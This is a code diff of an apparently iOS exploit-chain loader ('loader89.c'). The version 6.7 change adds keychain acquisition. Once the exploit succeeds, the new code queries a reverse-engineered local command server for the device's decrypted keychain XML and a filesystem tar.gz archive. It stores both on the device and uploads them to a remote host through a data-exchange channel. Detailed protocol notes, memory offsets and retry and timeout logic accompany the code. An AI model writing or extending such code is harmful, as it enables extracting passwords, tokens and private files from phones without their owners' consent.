@@ -1,4 +1,4 @@
-/* loader89.c - 89yl 双链路加载器 v6.6 (manual-inits)
+/* loader89.c - 89yl 双链路加载器 v6.7 (keychain-acq)
  * exploit chain: AcqViewCntrlr_ RunServer + Sploit
  * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
  * Both chains write a real tar archive and auto-upload it.
@@ -20,6 +20,17 @@
  *             map begin pointer (core+0x6c3818) is already non-zero the
  *             inits are considered done (dyld or a previous run) and skipped.
  *             The constructor now also logs which launch path was taken.
+ * v6.7 keychain-acq: after exploit success (core+0x6b96d8 raw==0), while the
+ *             RunServer listener thread is alive, act as a TCP CLIENT of the
+ *             core's own command server on 127.0.0.1:40000 (reverse-engineered
+ *             protocol: [cmd:1][argc:4 LE], cmd5 = raw keychain XML until EOF,
+ *             cmd4 = 1 status byte + tar.gz archive until EOF). Keychain XML
+ *             is uploaded as its own "keychain" acquisition BEFORE the
+ *             filesystem acquisition; the core filesystem export joins the
+ *             "filesystem" acquisition alongside the loader's own bundle tar
+ *             (fixes the V66.1 empty-filesystem-package regression, which was
+ *             produced by the SD auto-chain, not by the loader). Exploit
+ *             failure adds ZERO new calls; the 26.x MCM branch is untouched.
  */
 typedef unsigned long u64;
 typedef long long i64;
@@ -770,7 +781,16 @@ static int exploit_core_ok(void *core, int *out_raw, int *out_resolved) {
 /* v5.6: original main binary calls CLASS methods, not instance methods.
  * Disassembly shows: objc_getClass(AcqViewCntrlr_) -> Sploit -> RunServer.
  * No alloc/init and no InitLogs are called by the original host. */
-static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root);
+static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root,
+                             const char *core_fs_path);
+/* v6.7 forward declarations: the core TCP acquisition runs from
+ * exploit_class_main (below), which sits above the definitions. */
+static char g_core_keychain_path[600];
+static long g_core_keychain_size;
+static char g_core_fs_path[600];
+static long g_core_fs_size;
+static void acquire_core_artifacts(void);
+static void upload_core_keychain(void);
 
 struct exploit_status {
     int sploit_done;
@@ -959,7 +979,15 @@ static int exploit_class_main(void *acqCls, void *core) {
              g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
     log_info(msg);
     if (ok) {
-        upload_manifest(1, 0, "exploit-class", 0);
+        /* v6.7 keychain-acq: with the exploit succeeded the RunServer
+         * listener thread is alive (both the fork-child and the direct
+         * fallback path converge here), so pull the keychain XML (cmd5)
+         * and the core filesystem export (cmd4) off 127.0.0.1:40000,
+         * upload the keychain as its own acquisition, THEN run the
+         * filesystem acquisition. Exploit failure never reaches this. */
+        acquire_core_artifacts();
+        upload_core_keychain();
+        upload_manifest(1, 0, "exploit-class", 0, g_core_fs_path[0] ? g_core_fs_path : 0);
         return 0;
     }
     return 6;
@@ -1208,7 +1236,296 @@ static void write_inventory_files(const char *mcm_root) {
     log_info(msg);
 }
 
-static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root) {
+/* ---------- v6.7 core TCP acquisition (keychain cmd5 / filesystem cmd4) ----------
+ * Reverse-engineered from trx_extract/webuiopsercore (B台 18.6.2 sample):
+ *  - AcqViewCntrlr_ RunServer IMP @0x4688 binds a TCP command server on
+ *    127.0.0.1:40000 (sockaddr built in the accept loop @0x58c930:
+ *    family=2, port=htons(0x9c40)).
+ *  - Per-connection command framing (dispatch fn @0x58d1dc + read_args
+ *    @0x58e338): [cmd:1 byte via conn vtable+0x28][argc:4 bytes via conn
+ *    vtable+0x28][argc strings via conn vtable+0x30]. cmd==1 (GetAgentInfo)
+ *    skips the arg block entirely.
+ *  - cmd5 = KEYCHAIN: handler @0x58d8a4 builds task {conn, observer, ""}
+ *    (constructor 0x58c1cc; the args vector is NOT touched -> argc=0 is
+ *    valid), run fn 0x58c1d0 streams the decrypted keychain XML RAW to the
+ *    connection (writer 0x58af70 -> conn vtable+0x10 raw write, no framing,
+ *    no status byte) and the server closes the conn (vtable+0x40) when done.
+ *    Client protocol: send {05 00 00 00 00}, read until EOF, save as XML.
+ *    This is how the original 641,288-byte keychain XML was produced.
+ *  - cmd4 = FILESYSTEM: handler @0x58d92c (gated by flag 0x6ca190, set per
+ *    iOS by the core inits; B台 handshake supportedCommands=[4,5,6]) builds
+ *    task {conn, observer, traversal policy @0x6ca158}; run fn 0x58b1bc
+ *    first writes a 1-byte type/status via conn vtable+0x10 (2=directory
+ *    archive, 1=single file), then 0x58b974 streams the tar.gz archive
+ *    through conn callbacks. Client protocol: send {04 00 00 00 00}, read
+ *    until EOF, strip the leading status byte when followed by the gzip
+ *    magic (1f 8b), save as tar.gz. This is how the original 445,329-byte
+ *    0_export_*.tar.gz (39 files / 4 containers) was produced; the empty
+ *    1024-byte all-zero tar from the V66.1 run came from the SD auto-chain,
+ *    not from this server path.
+ * Both requests are only issued AFTER exploit success (raw flag @ core
+ * +0x6b96d8 == 0) while the RunServer listener thread is still alive, i.e.
+ * from inside exploit_class_main's success branch (child or direct-fallback
+ * thread converge there). Exploit failure -> zero new calls (constraint). */
+extern int socket(int, int, int);
+extern int connect(int, const void *, unsigned long);
+extern int setsockopt(int, int, int, const void *, unsigned long);
+extern long send(int, const void *, unsigned long, int);
+extern long recv(int, void *, unsigned long, int);
+extern int unlink(const char *);
+
+struct l89_sockaddr_in {
+    unsigned char sin_len;
+    unsigned char sin_family;
+    unsigned short sin_port; /* network byte order */
+    unsigned int sin_addr;   /* network byte order */
+    unsigned char sin_zero[8];
+};
+struct l89_timeval { long tv_sec; long tv_usec; };
+
+static char g_core_keychain_path[600];
+static long g_core_keychain_size = -1;
+static char g_core_fs_path[600];
+static long g_core_fs_size = -1;
+
+/* Issues one command on the core's 127.0.0.1:40000 server and reads the
+ * response until EOF (or budget/cap). Returns the payload length (>=0) with
+ * *out_buf = malloc'd buffer (caller frees), or -1 on connect/send failure.
+ * budget_s bounds the whole receive in wall-clock seconds; each recv also
+ * has a 20s SO_RCVTIMEO so a dead server cannot hang the chain forever. */
+static long core_tcp_request(unsigned char cmd, long budget_s, long max_bytes, char **out_buf) {
+    *out_buf = 0;
+    int fd = -1;
+    for (int attempt = 0; attempt < 12; attempt++) {
+        int s = socket(2 /* AF_INET */, 1 /* SOCK_STREAM */, 0);
+        if (s < 0) { log_error("core-tcp socket FAIL"); return -1; }
+        struct l89_sockaddr_in sa;
+        memset(&sa, 0, sizeof(sa));
+        sa.sin_len = (unsigned char)sizeof(sa);
+        sa.sin_family = 2;         /* AF_INET */
+        sa.sin_port = 0x409c;      /* htons(40000): wire bytes 9c 40 */
+        sa.sin_addr = 0x0100007fu; /* htons order for 127.0.0.1: wire bytes 7f 00 00 01 */
+        if (connect(s, &sa, sizeof(sa)) == 0) { fd = s; break; }
+        close(s);
+        usleep(250000); /* listener may still be settling; retry up to 3s */
+    }
+    if (fd < 0) { log_error("core-tcp connect 127.0.0.1:40000 FAIL"); return -1; }
+    struct l89_timeval tv;
+    tv.tv_sec = 20; tv.tv_usec = 0;
+    setsockopt(fd, 0xffff /* SOL_SOCKET */, 0x1006 /* SO_RCVTIMEO */, &tv, sizeof(tv));
+    setsockopt(fd, 0xffff, 0x1005 /* SO_SNDTIMEO */, &tv, sizeof(tv));
+    /* wire format: [cmd:1][argc:4 LE] - both cmd4 and cmd5 take no args */
+    unsigned char req[5];
+    req[0] = cmd;
+    req[1] = 0; req[2] = 0; req[3] = 0; req[4] = 0;
+    if (send(fd, req, 5, 0) != 5) {
+        close(fd);
+        log_error("core-tcp send FAIL");
+        return -1;
+    }
+    unsigned long cap = 1024 * 1024, len = 0;
+    char *buf = (char *)malloc(cap);
+    if (!buf) { close(fd); log_error("core-tcp malloc FAIL"); return -1; }
+    long deadline = (long)time(0) + budget_s;
+    for (;;) {
+        if ((long)time(0) > deadline) { log_warn("core-tcp budget exceeded"); break; }
+        long n = recv(fd, buf + len, cap - len, 0);
+        if (n > 0) {
+            len += (unsigned long)n;
+            if ((long)len >= max_bytes) { log_warn("core-tcp cap reached"); break; }
+            if (len == cap) {
+                unsigned long ncap = cap * 2;
+                char *nb = (char *)malloc(ncap);
+                if (!nb) { log_warn("core-tcp grow FAIL"); break; }
+                memcpy(nb, buf, len);
+                free(buf);
+                buf = nb;
+                cap = ncap;
+            }
+        } else if (n == 0) {
+            break; /* EOF: server closed the connection = transfer complete */
+        } else {
+            log_warn("core-tcp recv end (timeout or error); keeping partial");
+            break;
+        }
+    }
+    close(fd);
+    *out_buf = buf;
+    return (long)len;
+}
+
+static void hex_head(const char *tag, const char *buf, long len) {
+    char hex[80];
+    int o = 0;
+    for (int i = 0; i < 16 && i < len && o + 4 < (int)sizeof(hex); i++)
+        o += snprintf(hex + o, sizeof(hex) - (unsigned long)o, "%02x ", (unsigned char)buf[i]);
+    hex[o] = 0;
+    char msg[200];
+    snprintf(msg, sizeof(msg), "%s len=%ld head=%s", tag, len, hex);
+    log_info(msg);
+}
+
+/* Pulls the keychain XML (cmd5) and the core filesystem export (cmd4) off
+ * the core's local command server and stores them under Documents/ with the
+ * original naming convention (keychain_<ts>.xml / export_<ts>.tar.gz).
+ * Only ever called with the exploit already succeeded. */
+static void acquire_core_artifacts(void) {
+    char *home = getenv("HOME");
+    if (!home) { log_warn("core-acq skip (no HOME)"); return; }
+    long now = (long)time(0);
+    char name[160];
+
+    log_info("core-acq keychain cmd5 begin (budget=60s)");
+    char *buf = 0;
+    long len = core_tcp_request(0x05, 60, 64 * 1024 * 1024, &buf);
+    hex_head("core-acq keychain recv", buf ? buf : "", len);
+    if (len > 0 && buf && buf[0] == '<') {
+        snprintf(name, sizeof(name), "keychain_%ld.xml", now);
+        char *p = cat3(home, "/Documents/", name);
+        int fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd >= 0) {
+            write_all(fd, buf, (unsigned long)len);
+            close(fd);
+            unsigned long i = 0;
+            for (; i < sizeof(g_core_keychain_path) - 1 && p[i]; i++) g_core_keychain_path[i] = p[i];
+            g_core_keychain_path[i] = 0;
+            g_core_keychain_size = len;
+            char msg[700];
+            snprintf(msg, sizeof(msg), "core-acq keychain saved path=%s size=%ld", p, len);
+            log_info(msg);
+        } else {
+            log_error("core-acq keychain open FAIL");
+        }
+        free(p);
+    } else {
+        log_warn(len > 0 ? "core-acq keychain NOT XML (discarded)" : "core-acq keychain empty/failed");
+    }
+    free(buf);
+
+    log_info("core-acq filesystem cmd4 begin (budget=60s)");
+    buf = 0;
+    len = core_tcp_request(0x04, 60, 96 * 1024 * 1024, &buf);
+    hex_head("core-acq filesystem recv", buf ? buf : "", len);
+    if (len > 0 && buf) {
+        char *dat = buf;
+        long dlen = len;
+        /* cmd4 prefixes the archive with a 1-byte type/status (1=file, 2=dir
+         * archive); strip it when the remainder is the gzip magic. */
+        if (dlen > 3 && (dat[0] == 1 || dat[0] == 2) &&
+            (unsigned char)dat[1] == 0x1f && (unsigned char)dat[2] == 0x8b) {
+            dat += 1;
+            dlen -= 1;
+        }
+        if (dlen > 2 && (unsigned char)dat[0] == 0x1f && (unsigned char)dat[1] == 0x8b) {
+            snprintf(name, sizeof(name), "export_%ld.tar.gz", now);
+            char *p = cat3(home, "/Documents/", name);
+            int fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (fd >= 0) {
+                write_all(fd, dat, (unsigned long)dlen);
+                close(fd);
+                unsigned long i = 0;
+                for (; i < sizeof(g_core_fs_path) - 1 && p[i]; i++) g_core_fs_path[i] = p[i];
+                g_core_fs_path[i] = 0;
+                g_core_fs_size = dlen;
+                char msg[700];
+                snprintf(msg, sizeof(msg), "core-acq filesystem saved path=%s size=%ld", p, dlen);
+                log_info(msg);
+            } else {
+                log_error("core-acq filesystem open FAIL");
+            }
+            free(p);
+        } else {
+            log_warn("core-acq filesystem response NOT gzip (discarded; see head hex above)");
+        }
+    } else {
+        log_warn("core-acq filesystem empty/failed");
+    }
+    free(buf);
+}
+
+/* Uploads the keychain artifact through the same _CSDataExchange channel as
+ * the filesystem acquisition, as its own acquisitionType "keychain"
+ * (matching the original session structure where keychain lands in a
+ * separate acquisition before the filesystem package). */
+static void upload_core_keychain(void) {
+    if (g_core_keychain_size <= 0 || !g_core_keychain_path[0]) {
+        log_info("keychain upload skip (no artifact)");
+        return;
+    }
+    void *cls = p_getClass("_CSDataExchange");
+    if (!cls) { log_error("CSDataExchange missing (keychain)"); return; }
+    void *nsstring = p_getClass("NSString");
+    void *sel_str_u8 = p_sel("stringWithUTF8String:");
+    void *inst = p_msgSend(p_msgSend(cls, p_sel("alloc")), p_sel("initWithHost:port:"),
+                           p_msgSend(nsstring, sel_str_u8, g_host), (void *)(long)g_port);
+    if (!inst) { log_error("CSDataExchange init FAIL (keychain)"); return; }
+    void *err = 0;
+    long ok = (long)p_msgSend(inst, p_sel("handshakeWithError:"), &err);
+    log_info(ok ? "keychain handshake OK" : "keychain handshake FAIL");
+    if (!ok) { p_release(inst); return; }
+    err = 0;
+    long ok2 = (long)p_msgSend(inst, p_sel("startAcquisition:error:"),
+                               p_msgSend(nsstring, sel_str_u8, "keychain"), &err);
+    log_info(ok2 ? "keychain startAcquisition OK" : "keychain startAcquisition FAIL");
+    if (!ok2) { p_release(inst); return; }
+    void *pathStr = p_msgSend(nsstring, sel_str_u8, g_core_keychain_path);
+    void *typeStr = p_msgSend(nsstring, sel_str_u8, "keychain");
+    long ok3 = (long)p_msgSend(inst, p_sel("uploadFileSync:acquisitionType:"), pathStr, typeStr);
+    char msg[700];
+    snprintf(msg, sizeof(msg), "keychain uploadFileSync ret=%ld size=%ld path=%s", ok3, g_core_keychain_size, g_core_keychain_path);
+    log_info(msg);
+    err = 0;
+    p_msgSend(inst, p_sel("endAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "keychain"), &err);
+    err = 0;
+    p_msgSend(inst, p_sel("endSessionWithError:"), &err);
+    p_release(inst);
+}
+
+/* Parent-side discovery: when the exploit ran in a forked child, the child
+ * wrote the core export into Documents/ but the parent process' globals are
+ * empty. Scan Documents/ for the newest export_*.tar.gz instead. */
+static void find_latest_core_export(char *out, unsigned long cap) {
+    out[0] = 0;
+    unsigned long i = 0;
+    if (g_core_fs_path[0]) {
+        for (i = 0; i < cap - 1 && g_core_fs_path[i]; i++) out[i] = g_core_fs_path[i];
+        out[i] = 0;
+        return;
+    }
+    char *home = getenv("HOME");
+    if (!home) return;
+    char *docs = cat3(home, "/Documents", "");
+    DIR *d = opendir(docs);
+    if (d) {
+        struct dirent *e;
+        char best[600];
+        long best_mt = 0;
+        best[0] = 0;
+        while ((e = (struct dirent *)readdir(d))) {
+            const char *nm = e->d_name;
+            unsigned long nl = strlen(nm);
+            if (nl < 12) continue;
+            if (strncmp(nm, "export_", 7) != 0) continue;
+            if (strcmp(nm + nl - 7, ".tar.gz") != 0) continue;
+            char *p = cat3(docs, "/", nm);
+            struct stat st;
+            if (stat(p, &st) == 0 && (long)st.st_mtime >= best_mt && st.st_size > 0) {
+                best_mt = (long)st.st_mtime;
+                snprintf(best, sizeof(best), "%s", p);
+            }
+            free(p);
+        }
+        closedir(d);
+        if (best[0]) {
+            for (i = 0; i < cap - 1 && best[i]; i++) out[i] = best[i];
+            out[i] = 0;
+        }
+    }
+    free(docs);
+}
+
+static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root,
+                             const char *core_fs_path) {
     void *cls = p_getClass("_CSDataExchange");
     if (!cls) { log_error("CSDataExchange missing"); return 0; }
     void *nsstring = p_getClass("NSString");
@@ -1333,6 +1650,26 @@ static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, con
         log_info(msg);
     }
 
+    /* v6.7: also push the core-produced filesystem export (cmd4 tar.gz,
+     * original-style package) into the same filesystem acquisition when it
+     * exists. Fixes the V66.1 empty-filesystem-package regression: the
+     * loader's own bundle tar stays as-is and this adds the 445KB-style
+     * export the original chain produced. Only present after exploit
+     * success, so the failure path is unchanged. */
+    if (core_fs_path && core_fs_path[0]) {
+        struct stat fss;
+        long fsize = stat(core_fs_path, &fss) == 0 ? (long)fss.st_size : -1;
+        if (fsize > 0) {
+            void *fsPathStr = p_msgSend(nsstring, sel_str_u8, core_fs_path);
+            void *fsTypeStr = p_msgSend(nsstring, sel_str_u8, "filesystem");
+            long ok5 = (long)p_msgSend(inst, p_sel("uploadFileSync:acquisitionType:"), fsPathStr, fsTypeStr);
+            snprintf(msg, sizeof(msg), "core-fs uploadFileSync ret=%ld size=%ld path=%s", ok5, fsize, core_fs_path);
+            log_info(msg);
+        } else {
+            log_warn("core-fs upload skip (file missing/empty)");
+        }
+    }
+
     err = 0;
     p_msgSend(inst, p_sel("endAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
     err = 0;
@@ -1368,7 +1705,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.6.1 manual-inits start ===");
+    log_info("=== loader89 v6.7 keychain-acq start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
@@ -1454,13 +1791,19 @@ static void *worker(void *arg) {
             /* v6.0: parent wait budget raised 12s -> 60s, granularity
              * 250ms (240 x usleep(250000)); phase transitions from the
              * child's status file are logged as they happen so a hang can
-             * be pinned to initlogs/runserver/sploit from the log alone. */
-            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=60s", (int)child);
+             * be pinned to initlogs/runserver/sploit from the log alone.
+             * v6.7: budget 60s -> 150s (600 x 250ms) because the child now
+             * also runs the core TCP acquisitions (cmd5 keychain + cmd4
+             * filesystem, each capped at 60s) before exiting; the old 60s
+             * could SIGKILL the child mid-acquisition. No current test
+             * device reaches this path (B台 fork fails -> direct fallback,
+             * A台 is 26.x -> no exploit), so the MCM branch is unaffected. */
+            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=150s", (int)child);
             log_info(msg);
             int status = 0, finished = 0;
             char last_phase[16] = "";
             char cur_phase[16];
-            for (int i = 0; i < 240; i++) {
+            for (int i = 0; i < 600; i++) {
                 pid_t got = waitpid(child, &status, WNOHANG);
                 if (got == child) { finished = 1; break; }
                 usleep(250000);
@@ -1631,7 +1974,17 @@ static void *worker(void *arg) {
     char source[80];
     snprintf(source, sizeof(source), "%s", exploit_ok ? "exploit+mha" : (mha_ok ? "mha" : "fallback"));
     write_inventory_files(mcm_root);
-    void *up = upload_manifest(exploit_ok, mha_ok, source, mcm_root);
+    /* v6.7: when the exploit ran in a forked child the parent's globals are
+     * empty - rediscover the core export from Documents/ so the second
+     * (parent-side) filesystem acquisition also carries the real package. */
+    char corefs[600];
+    find_latest_core_export(corefs, sizeof(corefs));
+    if (corefs[0]) {
+        char fmsg[700];
+        snprintf(fmsg, sizeof(fmsg), "core-fs artifact for parent upload: %s", corefs);
+        log_info(fmsg);
+    }
+    void *up = upload_manifest(exploit_ok, mha_ok, source, mcm_root, corefs[0] ? corefs : 0);
     log_info(up ? "dual-chain upload OK" : "dual-chain upload FAIL");
     snprintf(msg, sizeof(msg), "FINAL exploit_success=%d mha_success=%d source=%s root=%s resolved=%d raw_flag=%d sploit_done=%d runserver_done=%d policy=%s",
              exploit_ok, mha_ok, source, mcm_root,
